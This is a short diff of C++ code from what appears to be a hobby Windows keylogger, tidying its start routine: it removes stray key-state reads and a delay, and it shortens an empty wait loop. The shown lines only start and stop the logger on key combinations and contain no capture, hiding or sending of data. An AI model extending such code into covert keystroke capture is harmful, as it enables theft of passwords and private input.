@@ -24,14 +24,8 @@ Program::Program()
 }
 void Program::start()
 {
-	Sleep(2000);
-	BYTE a[256] = {};
-	GetKeyboardState(a);
 	thread mainBackground = thread([=]() mutable {
 		while (!this->getInputControl().isPressedCombination(VK_CONTROL, 0x37)) {
-			int b = GetAsyncKeyState(VK_CONTROL);
-			int c = GetAsyncKeyState(0x32);
-			int a = this->getInputControl().getLastPressedVirtualKey();
 			if (this->getInputControl().isPressedCombination(VK_CONTROL, 0x32)) {
 				this->mx.lock();
 				cout << "Kyelogger start." << endl;
@@ -73,10 +67,7 @@ void Program::start()
 	if(!mainBackground.joinable())
 		mainBackground.join();
 
-	while (mainBackground.joinable())
-	{
-
-	}
+	while (mainBackground.joinable()){}
 }
 InputControl& Program::getInputControl()
 {
